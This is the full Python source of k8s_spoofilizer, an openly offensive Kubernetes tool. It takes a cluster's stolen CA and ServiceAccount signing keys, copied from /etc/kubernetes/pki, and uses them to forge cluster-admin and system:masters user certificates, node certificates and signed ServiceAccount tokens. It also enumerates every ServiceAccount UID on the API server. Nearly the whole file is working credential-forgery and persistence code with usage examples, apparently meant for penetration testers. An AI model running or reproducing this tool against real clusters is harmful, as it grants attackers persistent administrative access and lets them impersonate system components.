#!/usr/bin/env python3

'''
k8s_spoofilizer.py <https://github.com/jtesta/k8s_spoofilizer>
Copyright 2025  Joe Testa <jtesta@positronsecurity.com>

This program is free software: you can redistribute it and/or modify
it under the terms version 3 of the GNU General Public License as
published by the Free Software Foundation.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.
'''

import argparse
import base64
import json
import os
import shutil
import socket
import ssl
import subprocess
import sys
import tempfile
import time
import urllib.parse
import urllib.request
import uuid

from cryptography.hazmat.primitives import hashes, serialization
from cryptography.hazmat.primitives.asymmetric import padding


GITHUB_PROJECT_URL = "https://github.com/jtesta/k8s_spoofilizer"
GITHUB_PROJECT_ISSUES_URL = "{:s}/issues".format(GITHUB_PROJECT_URL)

# The size of RSA keys to generate. As of this writing, Kubernetes v1.32 uses 2048-bit keys, but in the future, they may require larger keys...
RSA_KEY_SIZE = 2048

HTTP_TIMEOUT = 10.0

# If we can't find the cluster's internal URL, we will use this default.
DEFAULT_CLUSTER_INTERNAL_URL = "https://kubernetes.default.svc.cluster.local"

# Terminal color codes.
CLEAR = "\033[0m"
RED = "\033[0;31m"
REDB = "\033[1;31m"
YELLOW = "\033[0;33m"
YELLOWB = "\033[1;33m"
GREEN = "\033[0;32m"
GREENB = "\033[1;32m"
WHITE = "\033[0;37m"
WHITEB = "\033[1;37m"


def base64url_encode(m):
    '''Given a set of bytes, apply the slightly modified base64 function to produce a properly encoded JWT field.'''
    return base64.urlsafe_b64encode(m).replace(b"=", b"")


def create_kubeconfig_from_cert(cert_type, _output_directory, ca_path, cert_path, key_path, cluster_role, username):
    '''Creates a kubeconfig file from a user or node certificate.'''

    kubeconfig_path = ""
    if cert_type == "user":
        kubeconfig_path = os.path.join(_output_directory, "kubeconfig_{:s}_{:s}".format(cluster_role.replace(":", "-"), username))
    elif cert_type == "node":
        kubeconfig_path = os.path.join(_output_directory, "kubeconfig_node_{:s}".format(username))

    # Read the CA data.
    ca_cert_data = ""
    with open(ca_path, "rb") as f:
        ca_cert_data = base64.b64encode(f.read()).decode("utf-8")

    # Read the certificate data.
    cert_data = ""
    with open(cert_path, "rb") as f:
        cert_data = base64.b64encode(f.read()).decode("utf-8")

    # Read the key data.
    key_data = ""
    with open(key_path, "rb") as f:
        key_data = base64.b64encode(f.read()).decode("utf-8")

    # Now write the kubeconfig file.
    with open(kubeconfig_path, "w", encoding="utf-8") as f:
        f.write("""apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: {:s}
    server: {:s}
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: {:s}
  name: {:s}@kubernetes
current-context: {:s}@kubernetes
kind: Config
preferences: {{}}
users:
- name: {:s}
  user:
    client-certificate-data: {:s}
    client-key-data: {:s}
""".format(ca_cert_data, get_api_server_url(_output_directory), username, username, username, username, cert_data, key_data))

    return kubeconfig_path


def create_kubeconfig_from_token(_output_directory, namespace, sa_name, token):
    '''Creates a kubeconfig file from a ServiceAccount token.'''


    token_name = "{:s}_{:s}".format(namespace, sa_name)
    kubeconfig_path = os.path.join(_output_directory, "kubeconfig_token_{:s}_{:s}".format(namespace, sa_name))

    # Read the CA data.
    ca_cert_data = ""
    with open(os.path.join(_output_directory, "ca.crt"), "rb") as f:
        ca_cert_data = base64.b64encode(f.read()).decode("utf-8")

    # Now write the kubeconfig file.
    with open(kubeconfig_path, "w", encoding="utf-8") as f:
        f.write("""apiVersion: v1
clusters:
- cluster:
    certificate-authority-data: {:s}
    server: {:s}
  name: kubernetes
contexts:
- context:
    cluster: kubernetes
    user: {:s}
  name: {:s}@kubernetes
current-context: {:s}@kubernetes
kind: Config
preferences: {{}}
users:
- name: {:s}
  user:
    token: {:s}
""".format(ca_cert_data, get_api_server_url(_output_directory), token_name, token_name, token_name, token_name, token))

    return kubeconfig_path



def create_clusteradmins_cert(_output_directory, _ca_cert_path, _ca_key_path):
    '''Create a default user certificate in the "cluster-admins" role with the username of "kubernetes-admin".'''

    default_clusteradmin_cert_path = os.path.join(_output_directory, "cluster-admins_kubernetes-admin.crt")
    default_clusteradmin_key_path = os.path.join(_output_directory, "cluster-admins_kubernetes-admin.key")

    # Create a default admin certificate if one was not created already in a prior run.
    ret = True
    if not os.path.isfile(default_clusteradmin_cert_path) or not os.path.isfile(default_clusteradmin_key_path):
        print("\ncluster-admins_kubernetes-admin.crt/key not found in directory {:s}. Generating them now...".format(_output_directory))
        ret = create_cert("user", _output_directory, _ca_cert_path, _ca_key_path, "cluster-admins", "kubernetes-admin")

    # Return the paths if they already exist or were successfully created, otherwise empty strings.
    return default_clusteradmin_cert_path if ret else "", default_clusteradmin_key_path if ret else ""


def create_cert(cert_type, _output_directory, _ca_cert_path, _ca_key_path, cluster_role, username):
    '''Creates either a user or a node certificate.'''

    if cert_type not in ["user", "node"]:
        raise RuntimeError("invalid cert_type arg: {:s}".format(cert_type))

    output_cert = ""
    output_key = ""
    if cert_type == "user":
        print(white("Creating a user certificate with a cluster role of {:s} and a username of {:s}...".format(cluster_role, username), bold=True))

        output_cert = os.path.join(_output_directory, "{:s}_{:s}.crt".format(cluster_role.replace(":", "-"), username))
        output_key = os.path.join(_output_directory, "{:s}_{:s}.key".format(cluster_role.replace(":", "-"), username))
    elif cert_type == "node":
        print(white("Creating a node certificate with a group of system:nodes and a name of {:s}...".format(username), bold=True))

        output_cert = os.path.join(_output_directory, "node_{:s}.crt".format(username))
        output_key = os.path.join(_output_directory, "node_{:s}.key".format(username))

    # If this key already exists in the output directory, terminate.
    if os.path.isfile(output_cert) or os.path.isfile(output_key):
        print("{:s} {:s} and/or {:s} already exist!".format(red("ERROR:"), output_cert, output_key))
        return False

    tempdir = tempfile.mkdtemp()
    csr_path = os.path.join(tempdir, "new.csr")
    good_retval = True

    # Create the CSR and put it into the temporary directory.
    command = ""
    if cert_type == "user":

        # New versions of Kubernetes use a "kubeadm:" prefix in the Organization field of the Distinguished Name.  Older ones do not.
        dn = "O=kubeadm:{:s}/CN={:s}".format(cluster_role, username)
        if cluster_role.startswith("system:"):
            dn = "O={:s}/CN={:s}".format(cluster_role, username)

        command = "openssl req -new -newkey rsa:{:d} -subj /{:s}/ -nodes -keyout {:s} -out {:s}".format(RSA_KEY_SIZE, dn, output_key, csr_path)

    elif cert_type == "node":
        # We first need to create the ECC key in a separate step.
        command = "openssl ecparam -genkey -name prime256v1 -out {:s}".format(output_key)
        print()
        print("Running command: {:s}".format(command))
        p = subprocess.run(command.split(" "), check=False)
        print()

        good_retval = good_retval and (p.returncode == 0)
        if p.returncode != 0:
            print(yellow("WARNING: return code is not 0: {:d}".format(p.returncode), bold=True))

        # Second step creates the CSR...
        command = "openssl req -new -subj /O=system:nodes/CN=system:node:{:s}/ -nodes -key {:s} -out {:s}".format(username, output_key, csr_path)

    print()
    print("Running command: {:s}".format(command))
    p = subprocess.run(command.split(" "), check=False)
    print()

    good_retval = good_retval and (p.returncode == 0)
    if p.returncode != 0:
        print(yellow("WARNING: return code is not 0: {:d}".format(p.returncode), bold=True))

    # Create the extensions file in the temporary directory.
    extfile = os.path.join(tempdir, "x509.ext")
    with open(extfile, "w", encoding="utf-8") as f:
        # Slight differences in the X509v3 extensions for user certificates vs node certificates.
        if cert_type == "user":
            f.write("keyUsage = critical, digitalSignature, keyEncipherment\n")
        elif cert_type == "node":
            f.write("keyUsage = critical, digitalSignature\n")
        f.write("extendedKeyUsage = clientAuth\n")
        f.write("basicConstraints=critical, CA:FALSE\n")
        f.write("authorityKeyIdentifier=keyid\n")

    # Generate a random serial number.
    serial_number = 0
    if cert_type == "user":
        serial_number = int.from_bytes(os.urandom(8), byteorder='little')
    elif cert_type == "node":
        serial_number = int.from_bytes(os.urandom(16), byteorder='little')

    # Sign the CSR and create the certificate.
    command = "openssl x509 -sha256 -CA {:s} -CAkey {:s} -days 365 -req -in {:s} -out {:s} -extfile {:s} -set_serial {:d}".format(_ca_cert_path, _ca_key_path, csr_path, output_cert, extfile, serial_number)
    print("Running command: {:s}".format(command))
    p = subprocess.run(command.split(" "), check=False)
    print()

    good_retval = good_retval and (p.returncode == 0)
    if p.returncode != 0:
        print(yellow("WARNING: return code is not 0: {:d}".format(p.returncode), bold=True))

    # Delete the temporary directory.
    try:
        shutil.rmtree(tempdir)
    except OSError:
        pass

    # If the openssl commands returned zero both times, and the output files exist and are greater than length zero, then we'll count this as a success.
    if good_retval and os.path.isfile(output_cert) and os.path.getsize(output_cert) > 0 and os.path.isfile(output_key) and os.path.getsize(output_key) > 0:

        server_url = get_api_server_url(_output_directory)
        print(green("\nSuccessfully created {:s} and {:s}!\n".format(output_cert, output_key), bold=True))
        print("{:s} The certificate can be tested with:".format(green("[+]", bold=True)))
        print("curl {:s}/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert {:s} --cert {:s} --key {:s} -X POST -H \"Content-Type: application/yaml\" -d \'{{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\"}}\'".format(server_url, _ca_cert_path, output_cert, output_key))
        print()

        kubeconfig_path = create_kubeconfig_from_cert(cert_type, _output_directory, _ca_cert_path, output_cert, output_key, cluster_role, username)
        print("{:s} A kubeconfig file has been created in {:s}. Test it with:".format(green("[+]", bold=True), kubeconfig_path))
        print("kubectl --kubeconfig={:s} auth whoami".format(kubeconfig_path))
        print()

        if cert_type == "user" and not cluster_role.startswith("system:"):
            print()
            print(white("NOTE: if this certificate does not work, then perhaps the target is running an older version of Kubernetes that expects a different format. In that case, try generating another certificate using a cluster role beginning with \"system:\", such as \"system:masters\".", bold=True))
            print()
        return True

    return False


def create_sa_token(_output_directory, ns_name, _sa_key_path, uid, ttl):
    '''Creates an SA token for the specified namespace & SA name.'''


    # Set the start time of the JWT validity to 15 seconds into the past (to account for any slight time discrepancies between our system and the server).
    start_time = int(time.time()) - 15

    # Get the SA's namespace and name.
    ns, name = ns_name.split("/")

    # If the user didn't specify an exact UID to use, attempt a lookup in the UID cache.
    if uid == "":

        # If the user didn't specify a UID to use, and the cache doesn't exist, we're done.
        if not os.path.isfile(os.path.join(_output_directory, "uid_cache.json")):
            print("{:s} No UID cache found! Either update the cache with --update-uid-cache or specify a UID to use with --uid.".format(red("ERROR:", bold=True)))
            return False

        # Load the cache from disk.
        uid_cache = None
        with open(os.path.join(_output_directory, "uid_cache.json"), "r", encoding="utf-8") as f:
            uid_cache = json.load(f)

        # If we found the UID in the cache...
        if ns_name not in uid_cache:
            print("{:s} No UID for {:s} found in the cache. Either update the cache with --update-uid-cache or specify a UID to use with --uid.".format(red("ERROR:", bold=True), ns_name))
            return False

        uid = uid_cache[ns_name]
        print("{:s} Found UID in cache for {:s}: {:s}".format(green("[+]"), ns_name, uid))
    else:
        print("{:s} Using provided UID ({:s}) to forge SA token.".format(green("[+]"), uid))

    # The key ID is normally filled in, but I don't know how to reconstruct it.  This would require a deep dive into the Kubernetes source code.  Fortunately, it seems like this field is ignored by the API server... for now...
    kid = ""

    cluster_url = get_cluster_internal_dns_url(_output_directory)
    expiration_time = start_time + ttl
    jwt_id = str(uuid.uuid4())

    header = "{{\"alg\":\"RS256\",\"kid\":\"{:s}\"}}".format(kid)
    body = "{{\"aud\":[\"{:s}\"],\"exp\":{:d},\"iat\":{:d},\"iss\":\"{:s}\",\"jti\":\"{:s}\",\"kubernetes.io\":{{\"namespace\":\"{:s}\",\"serviceaccount\":{{\"name\":\"{:s}\",\"uid\":\"{:s}\"}},\"nbf\":{:d},\"sub\":\"system:serviceaccount:{:s}:{:s}\"}}}}".format(cluster_url, expiration_time, start_time, cluster_url, jwt_id, ns, name, uid, start_time, ns, name)

    print()
    print(white("Unsigned & unencoded JWT:", bold=True))
    print(json.dumps(json.loads(header), indent=2))
    print(json.dumps(json.loads(body), indent=2))

    # Load the SA key for signing.
    sa_key_raw = b""
    with open(_sa_key_path, "rb") as f:
        sa_key_raw = f.read()
    sa_key = serialization.load_pem_private_key(sa_key_raw, None)

    # Base64-encode the header and body.
    header_encoded = base64url_encode(header.encode("utf-8"))
    body_encoded = base64url_encode(body.encode("utf-8"))

    # Sign the header and body, then assemble the finalized token.
    header_and_body_encoded = header_encoded + b"." + body_encoded
    signature = sa_key.sign(header_and_body_encoded, padding.PKCS1v15(), hashes.SHA256())
    token = (header_and_body_encoded + b"." + base64url_encode(signature)).decode("utf-8")

    # Create a kubeconfig file from the token.
    kubeconfig_path = create_kubeconfig_from_token(_output_directory, ns, name, token)

    print()
    print(green("Forged ServiceAccount token for {:s}/{:s} with TTL of {:d} seconds:".format(ns, name, ttl), bold=True))
    print(token)
    print()
    print("{:s} This token can be tested by putting it into an environment variable named $TOKEN, then running:".format(green("[+]")))
    print("curl {:s}/apis/authentication.k8s.io/v1/selfsubjectreviews --cacert {:s}/ca.crt -X POST -H \"Content-Type: application/yaml\" -H \"Authorization: Bearer $TOKEN\" -d '{{\"apiVersion\":\"authentication.k8s.io/v1\",\"kind\":\"SelfSubjectReview\"}}'".format(get_api_server_url(_output_directory), _output_directory))

    print()
    print("{:s} A kubeconfig file has been created in {:s}. Test it with:".format(green("[+]"), kubeconfig_path))
    print("kubectl --kubeconfig={:s} auth whoami".format(kubeconfig_path))
    print()
    return True


def disable_colors():
    '''Disables terminal colors.'''

    global CLEAR, RED, REDB, YELLOW, YELLOWB, GREEN, GREENB, WHITE, WHITEB  # pylint: disable=global-statement
    CLEAR = ""
    RED = ""
    REDB = ""
    YELLOW = ""
    YELLOWB = ""
    GREEN = ""
    GREENB = ""
    WHITE = ""
    WHITEB = ""


def get_api_server_url(_output_directory):
    '''Retrieves the API server's URL from the disk (useful when performing offline operations).'''

    url = "https://localhost:6443"
    try:
        with open(os.path.join(_output_directory, "api_server_url.txt"), "r", encoding="utf-8") as f:
            url = f.read().strip()
    except FileNotFoundError:
        print()
        print("{:s}: the api_server_url.txt file was not found; using {:s} as a placeholder.".format(yellow("WARNING"), url))
        print()

    return url


def get_cluster_internal_dns_url(_output_directory):
    '''Retrieves the cluster's internal DNS URL (needed for constructing ServiceAccount tokens).'''

    internal_dns_url_path = os.path.join(_output_directory, "internal_dns_url.txt")
    if not os.path.isfile(internal_dns_url_path):
        print()
        print("{:s}: the cluster's internal DNS URL was not found in {:s}. Using the default of {:s} instead. If this doesn't work, manually examine the API server's certificate Subject Alternative Names and put one in {:s}.".format(yellow("WARNING"), internal_dns_url_path, DEFAULT_CLUSTER_INTERNAL_URL, internal_dns_url_path))
        print()
        return DEFAULT_CLUSTER_INTERNAL_URL

    url = ""
    with open(internal_dns_url_path, "r", encoding="utf-8") as f:
        url = f.read().strip()

    return url


def green(s, bold=False):
    '''Prints a string in green.'''
    return GREENB + s + CLEAR if bold else GREEN + s + CLEAR


def red(s, bold=False):
    '''Prints a string in red.'''
    return REDB + s + CLEAR if bold else RED + s + CLEAR


def test_setup(_output_directory):
    '''Tests the specified directory and ensures that all needed data is present for future spoofing operations.'''

    def _check_pem_file(file_path, name):
        _ret = True
        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
            print("  {:s} {:s} ({:s}) is present.".format(green("[+]"), name, file_path))
        else:
            _ret = False
            print("  {:s} {:s} ({:s}) is MISSING!".format(red("[-]"), name, file_path))
        return _ret

    def _check_url_file(file_path, name):
        _ret = True
        if os.path.isfile(file_path):
            url = ""
            with open(file_path, "r", encoding="utf-8") as f:
                url = f.read().strip()

            if url.startswith("http://") or url.startswith("https://"):
                print("  {:s} {:s} ({:s}) exists and contains a proper URL.".format(green("[+]"), name, file_path))
            else:
                _ret = False
                print("  {:s} {:s} ({:s}) does not contain a proper URL!".format(red("[-]"), name, file_path))
        else:
            _ret = False
            print("  {:s} {:s} ({:s}) does not exist! Try running with --server and --update-uid-cache.".format(red("[-]"), name, file_path))
        return _ret


    ret = True
    print()
    print("Testing that all necessary data is present in {:s}...".format(_output_directory))

    ca_cert = os.path.join(_output_directory, "ca.crt")
    if not _check_pem_file(ca_cert, "CA certificate"):
        ret = False

    ca_key = os.path.join(_output_directory, "ca.key")
    if not _check_pem_file(ca_key, "CA private key"):
        ret = False

    sa_key = os.path.join(_output_directory, "sa.key")
    if not _check_pem_file(sa_key, "ServiceAccount private key"):
        ret = False

    api_server_url_path = os.path.join(_output_directory, "api_server_url.txt")
    if not _check_url_file(api_server_url_path, "Cached server URL file"):
        ret = False

    internal_dns_url_path = os.path.join(_output_directory, "internal_dns_url.txt")
    if not _check_url_file(internal_dns_url_path, "Internal URL file"):
        ret = False

    # Ensure that the UID cache file exists and has at least one entry in it.
    uid_cache = {}
    uid_cache_path = os.path.join(_output_directory, "uid_cache.json")
    if os.path.isfile(uid_cache_path):

        try:
            with open(uid_cache_path, "r", encoding="utf-8") as f:
                uid_cache = json.load(f)
        except json.decoder.JSONDecodeError:
            pass

        if len(uid_cache) > 0:
            print("  {:s} UID cache ({:s}) exists and has {:d} entries.".format(green("[+]"), uid_cache_path, len(uid_cache)))
        else:
            print("  {:s} UID cache ({:s}) is empty! Try running with --server and --update-uid-cache.".format(red("[-]"), uid_cache_path))
            ret = False
    else:
        print("  {:s} UID cache ({:s}) does not exist! Try running with --server and --update-uid-cache.".format(red("[-]"), uid_cache_path))
        ret = False

    if ret:
        print()
        print(green("Testing is successful! Data in {:s} is complete!".format(_output_directory), bold=True))
        print()
        print()
        print("{:s} it would be wise to manually count the number of ServiceAccounts in the cluster and compare this with the number of entries in the cache ({:d}). If there is a discrepancy, please file a Github Issue at: {:s}.".format(white("NOTE:", bold=True), len(uid_cache), GITHUB_PROJECT_ISSUES_URL))
        print()
    else:
        print()
        print("{:s} one or more problems were found! See above.".format(red("ERROR:", bold=True)))
        print()

    return ret


def update_uid_cache(_output_directory, _server_url, _ca_cert_path, _ca_key_path):
    '''Contacts the server, pulls the entire list of ServiceAccounts, and stores the associated UIDs in a local cache. Also records the server URL and internal DNS URL.'''

    # Write the server URL to disk so that it can be retrieved during offline operations.
    with open(os.path.join(_output_directory, "api_server_url.txt"), "w", encoding="utf-8") as f:
        f.write(_server_url)

    default_clusteradmin_cert_path, default_clusteradmin_key_path = create_clusteradmins_cert(_output_directory, _ca_cert_path, _ca_key_path)

    # Create an SSLContext that uses client certificate authentication. And verifies the server's cert.
    ctx = ssl.create_default_context()
    ctx.verify_mode = ssl.CERT_REQUIRED
    ctx.minimum_version = ssl.TLSVersion.TLSv1_2
    ctx.load_cert_chain(default_clusteradmin_cert_path, keyfile=default_clusteradmin_key_path)
    ctx.load_verify_locations(cafile=_ca_cert_path)

    print(white("Requesting list of all ServiceAccounts...", bold=True))
    sa_response = None
    with urllib.request.urlopen("{:s}/api/v1/serviceaccounts".format(_server_url), timeout=HTTP_TIMEOUT, context=ctx) as resp:
        if resp.status != 200:
            print(yellow("\nWARNING: request to obtain list of service accounts returned HTTP code {:d} instead of 200.\n".format(resp.status)))

        sa_response = json.load(resp)

    # Parse the JSON response for the ServiceAccount name, namespace, and uid.
    sa_parsed = {}
    if "items" in sa_response:
        print("Recieved {:d} ServiceAccounts.".format(len(sa_response["items"])))
        for item in sa_response["items"]:
            name = ""
            ns = ""
            uid = ""
            if "metadata" in item:
                name = item["metadata"]["name"] if "name" in item["metadata"] else ""
                ns = item["metadata"]["namespace"] if "namespace" in item["metadata"] else ""
                uid = item["metadata"]["uid"] if "uid" in item["metadata"] else ""

            if name != "" and ns != "" and uid != "":
                k = "{:s}/{:s}".format(ns, name)
                sa_parsed[k] = uid

    # Write the SA name, namespace, and uids into the cache file.
    uid_cache_path = os.path.join(_output_directory, "uid_cache.json")
    with open(uid_cache_path, "w", encoding="utf-8") as f:
        json.dump(sa_parsed, f)
        f.write("\n")

    print(green("Successfully updated UID cache in {:s}.".format(uid_cache_path), bold=True))

    # Extract the hostname and port from the server's URL.
    parsed_url = urllib.parse.urlparse(_server_url)
    host = parsed_url.hostname
    port = parsed_url.port if parsed_url.port is not None else 443

    # Get the certificate information of the API server.
    api_server_cert_info = {}
    ctx.check_hostname = False
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        with ctx.wrap_socket(s) as ss:
            ss.connect((host, port))
            api_server_cert_info = ss.getpeercert()

    # Attempt to infer the cluster's internal URL by looking at all the certificate's Subject Alternative Name entries, and picking the longest one.
    print()
    internal_dns_url = DEFAULT_CLUSTER_INTERNAL_URL
    if "subjectAltName" not in api_server_cert_info:
        print(yellow("WARNING: the Subject Alternative Name was not found in the server's certificate. Forged tokens will use the default of {:s} instead.".format(internal_dns_url)))
    else:
        longest_dns_name = ""
        longest_num_dots = 0
        san_tuples = api_server_cert_info["subjectAltName"]
        for san_tuple in san_tuples:
            if san_tuple[0] == "DNS":
                san = san_tuple[1]

                # If we found a longer DNS name, update our reference.
                if san.count(".") > longest_num_dots:
                    longest_dns_name = san

        if longest_dns_name == "":
            internal_dns_url = DEFAULT_CLUSTER_INTERNAL_URL
            print(yellow("WARNING: the Subject Alternative Name was not found in the server's certificate. Forged tokens will use the default of {:s} instead.".format(DEFAULT_CLUSTER_INTERNAL_URL)))
        else:
            internal_dns_url = "https://{:s}".format(longest_dns_name)
            print("{:s} Found internal cluster URL from server's Subject Alternative Name certificate extension: {:s}. This will be used in the forged ServiceAccount token JWTs.".format(green("[+]"), internal_dns_url))

    with open(os.path.join(_output_directory, "internal_dns_url.txt"), "w", encoding="utf-8") as f:
        f.write(internal_dns_url)

    return True


def white(s, bold=False):
    '''Prints a string in white.'''
    return WHITEB + s + CLEAR if bold else WHITE + s + CLEAR


def yellow(s, bold=False):
    '''Prints a string in yellow.'''
    return YELLOWB + s + CLEAR if bold else YELLOW + s + CLEAR


if __name__ == '__main__':
    example_usage = """SETUP:

Step 1: Create an empty local directory to store keys, certificates, etc.

Step 2: Copy Certificate Authority certificate & key from control plane node to new_dir/ca.crt and new_dir/ca.key. They usually live in /etc/kubernetes/pki/ca.*

Step 3: Copy Controller Manager's ServiceAccount key from control plane node to new_dir/sa.key. This usually lives in /etc/kubernetes/pki/sa.key (otherwise, examine "kube-controller-manager.yaml" and look for the "service-account-private-key" argument).

Step 4: Update the UID cache (see examples, below).

Step 5: Run the tests to ensure setup is complete: {:s} --test key_dir/

EXAMPLES:

# To update the local cache with the UIDs of ServiceAccounts so that SA tokens can be forged in the future (this enumerates all ServiceAccounts on the server):
{:s} --server https://kube-api:6443/ --update-uid-cache key_dir/

# To forge a user certificate using the CA with a cluster role of "cluster-admins" and a username of "kubernetes-admin" (offline operation):
{:s} --forge-user-cert cluster-admins/kubernetes-admin key_dir/

# To forge a node certificate using the CA (offline operation):
{:s} --forge-node-cert node-name key_dir/

# To forge a ServiceAccount token claiming to come from an SA in the "kube-system" namespace with a name of "daemon-set-controller" (offline operation):
{:s} --forge-sa-token kube-system/daemon-set-controller key_dir/

# To forge a ServiceAccount token using a specific UID (useful when no UID cache exists, or is out-dated) (offline operation):
{:s} --forge-sa-token default/sa --uid 41aa03dc-f0f4-4667-8af2-6a5017a3ade0 key_dir/
""".format(sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0], sys.argv[0])

    parser = argparse.ArgumentParser(description="Kubernetes Spoofilizer, Joe Testa <{:s}>".format(GITHUB_PROJECT_URL), allow_abbrev=False, epilog=example_usage, formatter_class=argparse.RawDescriptionHelpFormatter)

    parser.add_argument("directory", type=str, help="The directory to store keys and cached information regarding this cluster (see SETUP instructions below)")

    parser.add_argument("--update-uid-cache", action="store_true", dest="update_uid_cache", default=False, help="Downloads all ServiceAccounts from server and updates the local cache (requires --server)")
    parser.add_argument("--server", action="store", dest="server", default="", metavar="URL", type=str, help="Specifies the URL of the Kubernetes API endpoint (such as \"https://kube-api:6443/\")")
    parser.add_argument("--forge-user-cert", action="store", dest="forge_user_cert", default="", metavar="clusterrole/username", type=str, help="Forges an user certificate (offline operation)")
    parser.add_argument("--forge-node-cert", action="store", dest="forge_node_cert", default="", metavar="nodename", type=str, help="Forges a node certificate (offline operation)")
    parser.add_argument("--forge-sa-token", action="store", dest="forge_sa_token", default="", metavar="namespace/sa-name", type=str, help="Forges a ServiceAccount token. Attempts to use the UID value from the local UID cache, or the value provided by --uid (offline operation)")
    parser.add_argument("--uid", action="store", dest="uid", default="", type=str, help="Specifies the exact UID to use, ignoring any cached values (use with --forge-sa-token)")
    parser.add_argument("--ttl", action="store", dest="ttl", default=3600, type=int, help="The TTL of the SA token, measured in seconds (default: 3600)")
    parser.add_argument("--test", action="store_true", dest="test_setup", default=False, help="Tests the setup of a directory to ensure future operations have all the necessary information")
    parser.add_argument("-n", action="store_true", dest="no_color", default=False, help="Disables colorized output")

    # If no arguments were given, print the full help.
    if len(sys.argv) == 1:
        parser.print_help()
        sys.exit(-1)

    arg = parser.parse_args(args=sys.argv[1:])

    if not os.path.isdir(arg.directory):
        print("Error: output directory does not exist. Be sure to follow the setup instructions first:\n\n")
        parser.print_help()
        sys.exit(-1)

    ca_cert_path = os.path.join(arg.directory, "ca.crt")
    ca_key_path = os.path.join(arg.directory, "ca.key")
    sa_key_path = os.path.join(arg.directory, "sa.key")

    ret = True

    # The user wants to disable colorized output.
    if arg.no_color:
        disable_colors()

    # User wants to test their setup.
    if arg.test_setup:
        ret = test_setup(arg.directory)

    # User wants to update the UID cache.
    elif arg.update_uid_cache:
        if len(arg.server) == 0:
            print("ERROR: the --server argument must be provided when updating the cache.")
            sys.exit(-1)

        server_url = arg.server
        if server_url.endswith("/"):
            server_url = server_url[:-1]

        ret = update_uid_cache(arg.directory, server_url, ca_cert_path, ca_key_path)

    # User wants to forge a user certificate.
    elif arg.forge_user_cert != "":
        cluster_role, username = arg.forge_user_cert.split("/")
        ret = create_cert("user", arg.directory, ca_cert_path, ca_key_path, cluster_role, username)

    # User wants to forge a node certificate.
    elif arg.forge_node_cert != "":
        ret = create_cert("node", arg.directory, ca_cert_path, ca_key_path, "", arg.forge_node_cert)

    # User wants to forge a ServiceAccount token.
    elif arg.forge_sa_token != "":
        ret = create_sa_token(arg.directory, arg.forge_sa_token, sa_key_path, arg.uid, arg.ttl)

    if ret:
        sys.exit(0)

    sys.exit(-1)
